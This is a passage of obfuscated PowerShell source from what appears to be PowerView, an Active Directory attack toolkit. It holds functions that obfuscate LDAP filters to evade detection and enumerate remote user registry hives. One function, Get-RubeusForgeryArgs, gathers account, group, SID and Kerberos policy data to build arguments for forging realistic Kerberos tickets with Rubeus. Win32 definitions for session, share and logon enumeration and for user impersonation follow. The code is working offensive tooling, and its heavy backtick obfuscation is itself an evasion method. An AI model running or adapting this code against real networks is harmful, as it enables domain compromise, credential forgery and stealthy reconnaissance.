        ${s`Kip} = ${t`RUE}
    }
    for (${I}=1; ${i} -lt ${pa`Rts}.Length; ${i}++) {
        if (${s`kIp}) {
            if (${Par`Ts}[${I}] -notmatch 'userAccountControl') {
                ${S`KiP} = ${Fa`lSE}
            }
            if (${i} -eq ${Pa`R`Ts}.Length - 1) {
                ${oU`TFil`TeR} += "$($Parts[$i])"
            }
            else {
                ${o`UtfIL`T`er} += "$($Parts[$i])="
            }

        }
        else {
            if (${par`TS}[${i}].IndexOf(')') -ne -1) {
                ${VA`lUe} = ${pAr`Ts}[${i}].SubString(0,${P`AR`TS}[${i}].IndexOf(')'))
            }
            else {
                ${v`AL`UE} = ${Pa`RTs}[${I}]
            }
            if (${vAl`Ue}.Length -gt 1) {
                ${OU`T`VALu`eHaSh} = @{}
                for (${C}=0; ${c} -lt (GET`-R`ANdoM -Maximum $(${V`Alue}.Length) -Minimum 1); ${c}++) {
                    ${iN`Dex} = GeT`-`RAnd`oM -Maximum $(${V`ALuE}.Length - 1)
                    if ((${outV`Al`UeHa`SH}.keys | m`eA`sUre-oBje`cT).Count -ne 0) {
                        if (${oUTVAl`UE`HASh}.keys -contains ${IN`d`Ex}) {
                            Do
                            {
                                ${iNd`eX} = geT-`RA`ND`om -Maximum $(${v`AluE}.Length - 1)
                            } While (${ouTvaL`U`eHash}.keys -contains ${i`NDeX})
                        }
                    }
                    ${oU`TV`A`luEhaSh}[${i`NDEx}] = '\{0:x}' -f [System.Convert]::ToUInt32(${v`AL`UE}[${iNd`EX}])
                }
                for (${c}=0; ${c} -lt ${vA`luE}.Length; ${C}++) {
                    if (${out`VALuE`H`ASh}.keys -contains ${c}) {
                        ${OU`T`FilTer} += "$($OutValueHash[$c])"
                    }
                    else {
                        ${OUTfI`L`T`ER} += "$($Value[$c])"
                    }
                }
            }
            else {
                ${OU`TFILT`Er} += "$($Value)"
            }
            if (${PAr`Ts}[${I}].IndexOf(')') -ne -1) {
                ${n`exT} = ${PA`Rts}[${I}].SubString(${p`A`RTS}[${I}].IndexOf(')'))
                if (${I} -eq ${par`TS}.Length - 1) {
                    ${ou`TF`iLTer} += "$($Next)"
                }
                else {
                    ${OU`T`FiLteR} += "$($Next)="
                }
                if (${nE`xt} -match 'userAccountControl') {
                    ${S`kIP} = ${t`RuE}
                }
            }
            else {
                if (ge`T-r`AnDoM -Maximum 2) {
                    ${outFI`lt`er} += "="
                }
                else {
                    ${OU`TF`ILt`er} += '\3d'
                }
            }
        }
    }

    Wr`iTe`-V`erbose "[Get-ObfuscatedFilterString] Filter string obfuscated: $($OutFilter)"
    ${outf`Il`Ter}
}

function cOn`V`Er`T`-log`ONHourS {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${tr`Ue}, ValueFromPipeline = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        ${l`o`gON`hOurS}
    )

    BEGIN {
        ${da`yS} = @{
            0 = "Sunday";
            1 = "Sunday";
            2 = "Sunday";
            3 = "Monday";
            4 = "Monday";
            5 = "Monday";
            6 = "Tuesday";
            7 = "Tuesday";
            8 = "Tuesday";
            9 = "Wednesday";
            10 = "Wednesday";
            11 = "Wednesday";
            12 = "Thursday";
            13 = "Thursday";
            14 = "Thursday";
            15 = "Friday";
            16 = "Friday";
            17 = "Friday";
            18 = "Saturday";
            19 = "Saturday";
            20 = "Saturday";
        }

        ${h`oURs} = @{
            0 = 1;
            1 = 2;
            2 = 4;
            3 = 8;
            4 = 16;
            5 = 32;
            6 = 64;
            7 = 128;
        }

        ${o`UT`o`BJecT} = nEW-O`BJ`ECT pS`obje`CT -Property @{
            "Monday" = @{};
            "Tuesday" = @{};
            "Wednesday" = @{};
            "Thursday" = @{};
            "Friday" = @{};
            "Saturday" = @{};
            "Sunday" = @{};
        }
    }

    PROCESS {
        ${ByTeC`OU`N`TeR} = 0
        ${Da`y`c`OUntEr} = 0

        foreach (${B`yTE} in ${LogOn`h`ours}) {
            foreach (${b`It} in ${H`O`URs}.Keys) {
                ${pe`RMI`Tt`ed} = ${FA`LsE}
                if (${b`YTE} -band ${hou`RS}[${B`iT}]) {
                    ${p`e`RmitteD} = ${TR`Ue}
                }
                ${H`Our} = ${By`TE`CO`UNtER} * 8 + ${b`it}
                ${D`Ay} = ${d`AyS}[${dAy`CoU`Nter}]
                ${Out`O`BJe`ct}.${d`Ay}[${h`oUR}] = ${P`e`RmI`TTeD}
            }
            ${ByT`E`cO`UNTEr} += 1
            if (${bYTe`cOuNT`eR} -eq 3) {
                ${B`YTeco`UNT`er} = 0
            }
            ${Dayc`ouNt`Er} += 1
        }

        ${o`UTOb`JEct}
    }
}

function Get-ruBEusFo`RG`e`Ry`Args {

    [OutputType('String')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${IdEN`Ti`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`A`In},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`Er`VeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DE`N`TIAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`sl},

        [Switch]
        ${OBFU`SC`ATe}
    )


    BEGIN {
        ${s`EArCh`EraRGuME`NTS} = @{}
        if (${pSBo`Un`dParAM`eTerS}['Domain']) { ${sEArC`HErA`R`G`UmEn`Ts}['Domain'] = ${Do`ma`in} }
        if (${pS`BOU`ND`p`ARamEterS}['Server']) { ${S`earC`He`RARGUME`Nts}['Server'] = ${SEr`VeR} }
        if (${PsB`OuNDpaRaM`ete`RS}['Credential']) { ${s`EARChE`Ra`Rgume`NTS}['Credential'] = ${cr`EDeN`TI`Al} }
        if (${PsbOun`D`p`ARAMEtERS}['SSL']) { ${sEaR`c`heRAr`gUM`en`TS}['SSL'] = ${S`Sl} }
        if (${pSBoUN`dp`AramET`E`RS}['Obfuscate']) {${S`eaRCher`ArGum`eNTS}['Obfuscate'] = ${ObfU`S`CA`Te} }

        ${fo`ResT`Arg`U`MEnTs} = @{}
        if (${PsBOUnD`Par`AMe`Te`Rs}['Domain']) { ${sE`A`RChER`ArgU`men`TS}['Domain'] = ${D`OMAin} }
        if (${p`SboU`NdPa`RA`Met`ERS}['Server']) { ${sEarchEr`Ar`GU`ME`Nts}['Server'] = ${s`E`RvER} }
    }

    PROCESS {
        ${filT`Er} = ''
        ${id`enTi`TY} | geT-IDE`Nt`i`TyFIlterST`Ring | FoR`eacH-`objeCT {
            ${FiL`Ter} += ${_}
        }
        if (-not ${FiLt`Er} -or ${fi`LtEr} -eq '') {
            WRite-e`Rr`Or "[Get-RubeusForgeryArgs] Identity argument is required!"
            return
        }
        
        ${DoMa`i`NP`OlICy} = g`ET-dOmAI`NP`OLicy -Policy doMA`in @SearcherArguments
        

        wRIte-V`E`RbosE "[Get-RubeusForgeryArgs] filter string: (|$Filter)"
        ${re`SuLts} = iN`VOKe-ldaPQu`E`Ry @SearcherArguments -LDAPFilter "(|$Filter)"
        ${Re`sUl`Ts} | WHER`E-`oBjeCT {${_}} | foR`eA`c`H-ObJEct {
            ${oUT`Ar`g`Um`EntS} = ''
            if (G`ET-MeMb`er -inputobject ${_} -name "Attributes" -Membertype Pro`perTi`ES) {
                ${P`ROP} = @{}
                foreach (${A} in ${_}.Attributes.Keys | SOrt-ob`j`e`Ct) {
                    if ((${A} -eq 'objectsid') -or (${a} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${A} -eq 'usercertificate') -or (${a} -eq 'ntsecuritydescriptor') -or (${a} -eq 'logonhours')) {
                        ${p`RoP}[${A}] = ${_}.Attributes[${a}]
                    }
                    else {
                        ${VaL`Ues} = @()
                        foreach (${V} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                            ${v`ALU`es} += [System.Text.Encoding]::UTF8.GetString(${V})
                        }
                        ${Pr`oP}[${A}] = ${VAL`U`es}
                    }
                }
            }
            else {
                ${p`ROP} = ${_}.Properties
            }

            ${aCCoU`NT} = CO`Nve`R`T-ldap`PropeR`TY -Properties ${P`Rop}
            ${ACCOu`NT}.PSObject.TypeNames.Insert(0, 'PowerView.Account')

            
            ${a`cc`ounTID} = ${Ac`co`UNT}.objectsid.Substring(${ac`c`oUnt}.objectsid.LastIndexOf('-')+1)
            ${D`OmAI`Nsid} = ${acCo`U`NT}.objectsid.Substring(0, ${aC`cOu`Nt}.objectsid.LastIndexOf('-'))

            
            ${groUP`F`Ilter} = ''
            foreach (${g`ROup} in ${Ac`C`oUnt}.memberof) {
                ${GR`o`Up`FILteR} += "(distinguishedname=$group)"
            }
            ${gROU`Ps} = @()
            if (${gROuP`F`ilteR}) {
                ${G`Rou`pFi`lTeR} = "(|$GroupFilter)"
                wR`Ite-veRb`O`se "[Get-RubeusForgeryArgs] filter string: $GroupFilter"

                ${r`eSUl`Ts} = INvoke`-Ld`A`pqU`ERy @SearcherArguments -LDAPFilter "$GroupFilter"
                ${RESuL`TS} | wHe`RE`-obJE`cT {${_}} | FOrEaC`H-O`BJE`CT {
                    if (GE`T-mEM`Ber -inputobject ${_} -name "Attributes" -Membertype Prope`RTI`es) {
                        ${PR`op} = @{}
                        foreach (${A} in ${_}.Attributes.Keys | So`Rt-`oBj`ecT) {
                            if ((${A} -eq 'objectsid') -or (${a} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${a} -eq 'usercertificate') -or (${A} -eq 'ntsecuritydescriptor') -or (${a} -eq 'logonhours')) {
                                ${p`RoP}[${a}] = ${_}.Attributes[${a}]
                            }
                            else {
                                ${v`A`LUeS} = @()
                                foreach (${v} in ${_}.Attributes[${a}].GetValues([byte[]])) {
                                    ${va`lUeS} += [System.Text.Encoding]::UTF8.GetString(${V})
                                }
                                ${PR`op}[${a}] = ${VA`L`UES}
                            }
                        }
                    }
                    else {
                        ${Pr`op} = ${_}.Properties
                    }

                    ${GrOu`p`OBj`eCt} = C`onVE`RT-L`daPPROPER`Ty -Properties ${P`ROP}
                    ${g`R`Oupid} = ${gR`O`UPobJEcT}.objectsid.Substring(${grO`U`pObj`Ect}.objectsid.LastIndexOf('-')+1)
                    ${GrOU`ps} += ${Gr`OupID}
                }
            }

            
            ${Do`MaIn`oBJe`cT} = GeT-`domA`in @ForestArguments
            ${Do`M`Ain} = ${DoMA`ino`BJECT}.Name
            ${f`O`RESt} = ${D`OmaI`NOB`JE`CT}.Forest

            ${fO`Rest`DN} = "DC=$($Forest -replace '\.',',DC=')"
            ${C`O`Nf`igdn} = "CN=Configuration,$ForestDN"
            ${nEtB`io`sfiLter} = "(&(netbiosname=*)(dnsroot=$Domain))"
            ${Ne`T`BIOsn`Ame} = (G`eT`-d`om`AInob`jECt -SearchBase "$ConfigDN" -LdapFilter "$NetbiosFilter" @SearcherArguments).netbiosname

            
            ${N`oW} = gET-d`A`TE

            
            ${ou`TaR`GUMeNts} = "/user:$($Account.samaccountname) /id:$AccountID /sid:$DomainSID /netbios:$NetbiosName /dc:$($DomainObject.DomainControllers[0].Name) /domain:$Domain /pgid:$($Account.primarygroupid) /displayname:""$($Account.displayname)"" /logoncount:$($Account.logoncount) /badpwdcount:$($Account.badpwdcount) /pwdlastset:""$($Account.pwdlastset.ToString())"" /lastlogon:""$($Now.AddSeconds(-$(Get-Random -Maximum 10)).ToString())"""
            if (${accO`U`NT}.useraccountcontrol -ne "NORMAL_ACCOUNT") {
                ${o`UT`ARgu`meNTs} += " /uac:$($Account.useraccountcontrol -replace ' ','')"
            }
            if (${G`R`OUpS}.Length -gt 0) {
                ${o`UTaR`GU`mENtS} += " /groups:$($Groups -join ',')"
            }
            if (${ac`co`Unt}.scriptpath) {
                ${ouT`ArguM`e`NTS} += " /scriptpath:""$($Account.scriptpath)""" 
            }
            if (${A`CcOu`NT}.profilepath) {
                ${O`UTaRg`UMe`NTs} += " /profilepath:""$($Account.profilepath)""" 
            }
            if (${aCc`oU`NT}.homedrive) {
                ${outAR`Gume`N`Ts} += " /homedrive:""$($Account.homedrive)""" 
            }
            if (${acc`o`UnT}.homedirectory) {
                ${Ou`Ta`R`guMENTS} += " /homedir:""$($Account.homedirectory)""" 
            }
            if (${ac`COu`Nt}.logonhours) {
                ${lO`G`ofFti`me} = GET-LO`g`OF`F`TiME -LogonHours ${a`C`COuNT}.logonhours -LogonTime ${N`ow}
                if (${LO`G`OfFtime} -and ${L`oGofft`I`me} -ne ${n`ow}) {
                    ${outaRgu`Men`TS} += " /logofftime:""$($LogoffTime.AddMinutes(-$LogoffTime.Minute).AddSeconds(-$LogoffTime.Second).ToString())"""
                }
            }
            elseif (${L`oGofFTi`Me} -eq ${n`OW}) {
                WRIT`E-waR`N`ing "[Get-RubeusForgeryArgs] User is not allowed to login now!"
            }
            if (${dO`MaIN`p`o`liCY}.SystemAccess.MinimumPasswordAge -gt 0) {
                ${oUTa`RgumE`N`Ts} += " /minpassage:$($DomainPolicy.SystemAccess.MinimumPasswordAge)"
            }
            
            if (${DOm`AINp`Ol`ICY}.SystemAccess.MaximumPasswordAge -gt 0 -and ${AcC`o`UNT}.useraccountcontrol -notmatch "DONT_EXPIRE_PASSWORD") {
                ${OU`TARg`UMEn`Ts} += " /maxpassage:$($DomainPolicy.SystemAccess.MaximumPasswordAge)"
            }
            
            if (${g`RoUPs}.Contains("525")) {
                ${ouT`A`RG`UME`NtS} += " /endtime:240m /renewtill:240m"
            }
            else {
                if (${d`omAi`N`pol`icY}.KerberosPolicy.MaxTicketAge -ne 10) {
                    ${Out`Ar`Gu`MEn`TS} += " /endtime:$($DomainPolicy.KerberosPolicy.MaxTicketAge)h"
                }
                if (${domaIn`pOl`I`cY}.KerberosPolicy.MaxRenewAge -ne 7) {
                    ${oUT`ARGum`eNTS} += " /renewtill:$($DomainPolicy.KerberosPolicy.MaxRenewAge)d"
                }
            }

            ${out`A`RGUMeNTs}
        }
    }
}

function GEt-loGo`F`FTIMe {

    [OutputType([DateTime])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        ${L`o`GONhoU`RS},

        [DateTime]
        ${L`Ogo`Nt`Ime}
    )

    BEGIN {
        ${d`AYS} = @{
            1 = "Sunday";
            2 = "Monday";
            3 = "Tuesday";
            4 = "Wednesday";
            5 = "Thursday";
            6 = "Friday";
            7 = "Saturday";
        }
    }

    PROCESS {
        ${H`OUr} = ${lOg`On`Time}.Hour
        ${d`Ay} = ${da`YS}[${logON`Ti`ME}.Day]
        if (-not ${loG`oNH`oU`RS}.${D`Ay}.${H`OUR}) {
            WRIte-`V`Erb`O`Se "[Get-LogoffTime] User is not allowed to logon now!"
            ${lOgo`N`TimE}
        }
        ${O`Utt`iMe} = ${lo`gOnti`me}
        ${l`EF`ToVeR} = 23 - ${H`OUr}
        ${FO`UnD`LogO`FF} = ${fA`LSe}
        for (${I}=0; ${i} -lt 7; ${I}++) {
            ${D`AY} = ${dA`yS}[$(${L`o`GOntI`mE}.Day + ${i})]
            if (${I} -eq 0) {
                ${cOUn`T`ER} = ${Ho`UR} + 1
            }
            else {
                ${CoU`Nt`eR} = 0
            }
            do {
                ${o`UTt`ime} = ${oUTti`Me}.AddHours(1)
                if (-not ${lOg`Onh`OURs}.${d`Ay}.${cOu`Nt`eR}) {
                    ${f`ounD`l`oGofF} = ${t`Rue}
                    break
                }
                ${cO`U`NTeR} += 1
            } while (${C`ouNT`ER} -lt 24)
            if (${fOu`NDlOGo`Ff}) {
                break
            }
        }

        if (-not ${FO`UN`Dl`ogoff} -and ${h`OUr} -gt 0) {
            ${d`Ay} = ${d`AYs}[${lOG`O`NT`iME}.Day]
            for (${i}=0; ${i} -lt ${h`oUr}; ${i}++) {
                ${o`Utt`iME} = ${Outti`me}.AddHours(1)
                if (-not ${l`OGOn`h`OURS}.${d`Ay}.${I}) {
                    ${FO`UnDl`OG`OFF} = ${T`Rue}
                    break
                }
            }
        }

        if (${F`OuNDloG`o`FF}) {
            ${o`Ut`TImE}
        }
        else {
            ${fOUNdL`oGo`FF}
        }
    }
}

function geT`-R`egIs`TryU`sER`eNUm {


    [CmdletBinding(SupportsShouldProcess=${t`Rue},
        ConfirmImpact='Medium')]
    Param
    ( 
        [parameter(Position=0, ValueFromPipeline=${TR`UE}, ValueFromPipelineByPropertyName=${TR`Ue})]
        [Alias('DNSHostName', 'Name', 'Server')]
        [String[]]
        ${C`oMP`Ut`eRna`ME} = '.',

        [Switch]
        ${ch`e`ck}
    )
    Begin {
    }
    Process {
        Foreach (${cOm`p`Uter} in ${Co`MP`U`TernamE}) {
            if (tesT`-coNn`EctION ${C`oM`pUt`eR} -Count 2 -Quiet) {
                ${R`eg} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', ${Co`MPU`Ter})
                ${SUbke`YS} = ${r`eg}.GetSubKeyNames() | ?{${_} -notmatch '.DEFAULT' -and ${_} -notmatch '_Classes'}
                if (${PSboU`NDPARAme`T`E`RS}['Check'] -and ${sUbK`E`YS}.Length -gt 0) {
                    ${coM`pU`TER}
                } elseif (${SuBk`eyS}.Length -gt 0) {
                ${U`se`Rs} = @()
                foreach (${S`Ub`KEy} in ${Su`BkeyS}) {
                    ${U`sEr} = New-`objE`Ct Pso`B`JEcT
                    ${US`Er} | aDD`-`membEr -Name S`id -MemberType NotEPROP`eR`TY -Value ${sU`Bk`Ey}
                    ${US`Er} | a`DD-mEm`BEr -Name na`mE -MemberType noteP`RoPE`RTY -Value (cONvERtfRo`M`-`SID ${S`Ub`key})
                    ${us`Ers} += ,${uS`Er}
                }
                ${o`Bj} = nE`w-O`BjEct P`SobJECt
                ${o`BJ} | a`DD`-mEMB`Er -Name C`oMP`UteR -MemberType nO`TEpro`PerTY -Value ${CO`m`PUTEr}
                ${O`BJ} | A`DD-M`EmB`ER -Name USe`Rs -MemberType n`otEpRopE`R`Ty -Value ${use`Rs}
                ${O`BJ}
                } else {
                    w`R`i`TE-WArNi`Ng "$Computer connected but did not return subkeys"
                }
            }
            else {
                WRiTe-e`R`Ror "$Computer not reachable"
            }
        }
    }
    End {
        
    }
}












${m`oD} = nEw`-INmeMORY`m`Od`ULE -ModuleName wIn`32




${sAm`ACCoUnt`T`YpEEn`Um} = psE`NUm ${m`oD} poweRVie`W.`SAMa`Cc`oUN`TTYpEeNUm U`iNT32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}


${GroUPtypE`e`NUM} = P`s`Enum ${M`Od} pOWERv`i`eW`.`grO`U`PTypeenum Ui`Nt`32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield


${U`A`CenUM} = P`Se`NUM ${m`Od} p`O`wEr`V`iEw.UacENum U`iNt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    NO_AUTH_DATA_REQUIRED           =   33554432
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield


${WTsCoN`NECT`S`T`Ate} = psEn`UM ${m`Od} wts`_coNNEcTS`Ta`T`E_CL`AsS U`iNt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


${wtS`_`Se`ss`ioN_iNfo_1} = s`TRU`CT ${M`OD} PoWer`Vi`eW.RDP`SeS`sio`N`i`NFO @{
    ExecEnvId = F`IElD 0 u`InT32
    State = F`ieLd 1 ${Wts`C`ONneC`T`StA`Te}
    SessionId = fI`ELD 2 uI`Nt`32
    pSessionName = Fie`Ld 3 stR`I`NG -MarshalAs @('LPWStr')
    pHostName = f`ieLd 4 s`Tri`NG -MarshalAs @('LPWStr')
    pUserName = fi`eld 5 s`T`RinG -MarshalAs @('LPWStr')
    pDomainName = fI`eLd 6 Str`I`NG -MarshalAs @('LPWStr')
    pFarmName = Fi`eLd 7 St`R`ing -MarshalAs @('LPWStr')
}


${W`T`s_clIEn`T_`AdDr`ESS} = StR`U`cT ${m`oD} wTS_C`liEnt_`AD`D`RE`SS @{
    AddressFamily = FiE`ld 0 Ui`Nt`32
    Address = F`IElD 1 B`Yte[] -MarshalAs @('ByValArray', 20)
}


${S`hArE`_InfO_1} = st`R`UCT ${m`od} powerView.`sh`AREI`NfO @{
    Name = FIe`ld 0 STri`NG -MarshalAs @('LPWStr')
    Type = Fie`ld 1 UI`NT`32
    Remark = Fie`lD 2 ST`Ri`Ng -MarshalAs @('LPWStr')
}


${WkStA`_uSEr_`Inf`o_1} = s`TrUCt ${M`OD} P`Ow`ER`ViEW.LogGedO`NusE`Ri`N`FO @{
    UserName = FIe`lD 0 s`TriNG -MarshalAs @('LPWStr')
    LogonDomain = f`IELd 1 sTrI`Ng -MarshalAs @('LPWStr')
    AuthDomains = Fie`Ld 2 s`TRINg -MarshalAs @('LPWStr')
    LogonServer = f`IElD 3 s`Tri`Ng -MarshalAs @('LPWStr')
}


${SEs`si`ON_IN`Fo_10} = st`RuCt ${m`Od} pOwErVIEW`.s`ES`SIoniNFO @{
    CName = FI`Eld 0 sTR`INg -MarshalAs @('LPWStr')
    UserName = FIE`LD 1 STrI`Ng -MarshalAs @('LPWStr')
    Time = fi`eLd 2 ui`NT32
    IdleTime = F`Ield 3 U`Int`32
}


${sId_`NAm`E_`U`sE} = ps`E`NUM ${m`oD} s`Id_N`Am`E_USE Uin`T16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


${l`OCAl`g`RouP_infO`_1} = st`RuCt ${m`OD} LoCalGRo`U`P`_INFo_1 @{
    lgrpi1_name = fIE`LD 0 ST`Ri`NG -MarshalAs @('LPWStr')
    lgrpi1_comment = fIE`ld 1 s`TRi`NG -MarshalAs @('LPWStr')
}


${lOcaLg`ROu`P_MEmBE`RS`_I`N`Fo`_2} = st`RUcT ${M`od} LOc`A`LgRoUP_`M`EmBE`RS_iN`Fo`_2 @{
    lgrmi2_sid = FIe`lD 0 IN`TPtr
    lgrmi2_sidusage = f`IELD 1 ${sID_`N`A`Me_USE}
    lgrmi2_domainandname = f`IeLd 2 St`R`ING -MarshalAs @('LPWStr')
}


${d`sD`oMAinFLAg} = Ps`E`NUM ${M`OD} Ds`D`OMAIn.Flags ui`NT32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
${DSdOmaiN`Tru`S`TT`Ype} = p`seN`Um ${M`OD} D`sDOM`Ai`N.`TrUST`TyPe uiN`T32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${dSdomAin`TR`Ust`A`TtriB`UTes} = p`SEnUM ${m`od} D`SD`OMAin.t`RU`s`TATTR`Ibutes UIN`T32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


${Ds_DOmAI`N`_truS`TS} = STru`Ct ${M`oD} d`s_`DOMain_Tr`UsTs @{
    NetbiosDomainName = fI`Eld 0 S`TrinG -MarshalAs @('LPWStr')
    DnsDomainName = fI`eld 1 s`TRiNG -MarshalAs @('LPWStr')
    Flags = FiE`LD 2 ${DSdO`maiN`Fl`AG}
    ParentIndex = FiE`LD 3 u`INt32
    TrustType = f`iELd 4 ${dSdOmaiN`Tr`U`S`Tt`yPe}
    TrustAttributes = FIE`ld 5 ${Dsd`OmA`IntrUStatt`R`ibUT`eS}
    DomainSid = FI`ELd 6 IN`TPTr
    DomainGuid = f`iElD 7 G`UiD
}


${NetReS`Our`cEW} = S`Tru`cT ${m`oD} neT`Re`SoU`RCew @{
    dwScope =         fI`ELd 0 UINt`32
    dwType =          F`IELd 1 U`inT32
    dwDisplayType =   f`IEld 2 ui`NT32
    dwUsage =         f`IelD 3 u`INt`32
    lpLocalName =     FIE`Ld 4 S`TrI`NG -MarshalAs @('LPWStr')
    lpRemoteName =    Fi`eld 5 St`RiNg -MarshalAs @('LPWStr')
    lpComment =       f`iEld 6 s`TRiNG -MarshalAs @('LPWStr')
    lpProvider =      Fi`ELd 7 s`TrI`Ng -MarshalAs @('LPWStr')
}


${fuNcTioNDE`FiniT`IO`Ns} = @(
    (fU`NC Ne`TA`pi32 n`EtSh`AReeNUM ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f`UnC N`eTA`pI32 NEtWKStAUse`R`e`N`Um ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (f`UnC nEtA`Pi32 nE`TSeS`SIoNENuM ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (fU`NC NeTaP`I32 nEtl`OCalg`R`oup`EnUM ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (Fu`Nc nEta`Pi`32 nEtLoCA`l`gRO`UpGe`TMe`Mb`ErS ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (F`UNc N`E`TAPI32 dsget`siT`enAme ([Int]) @([String], [IntPtr].MakeByRefType())),
    (F`Unc n`EtApi32 d`senUmERaTEd`oM`AiNTruS`TS ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (FU`Nc nEt`APi`32 NETAPiB`UFFe`RfR`EE ([Int]) @([IntPtr])),
    (f`UnC aD`VA`Pi32 CoNVeRTsi`DTOS`T`Rin`GS`iD ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (FU`Nc ad`VapI`32 oPe`NSCmAnaGe`RW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (FU`Nc aDV`A`Pi32 ClOsE`sErvi`CEHanD`lE ([Int]) @([IntPtr])),
    (f`UNc aDV`Api`32 LogOnU`S`Er ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (fU`NC Adva`pi32 iMPeRSoNa`TE`LO`g`gEdo`N`User ([Bool]) @([IntPtr]) -SetLastError),
    (f`Unc a`dV`Api32 ReVEr`Tt`Ose`lf ([Bool]) @() -SetLastError),
    (fU`NC Wt`SapI`32 wTSopenS`erVe`REX ([IntPtr]) @([String])),
    (f`Unc wTSA`pI32 W`TsENUmera`T`ese`SS`IonSex ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (F`Unc WT`sap`i32 wTSqUERy`S`EssIoNInfo`RmATi`oN ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (f`UNC w`TSA`PI32 wtSF`R`EE`MemOrY`eX ([Int]) @([Int32], [IntPtr], [Int32])),
    (F`UnC Wt`S`ApI32 Wt`SF`REEMEMo`Ry ([Int]) @([IntPtr])),
    (f`UNC WTs`API32 WtSCLOSES`ER`V`eR ([Int]) @([IntPtr])),
    (FU`Nc M`PR wnEtA`dd`CONNe`CTI`oN2w ([Int]) @(${Net`ReS`ourcew}, [String], [String], [UInt32])),
    (fu`Nc M`pr Wn`Etc`ANCel`c`o`N`NECtiOn2 ([Int]) @([String], [Int], [Bool])),
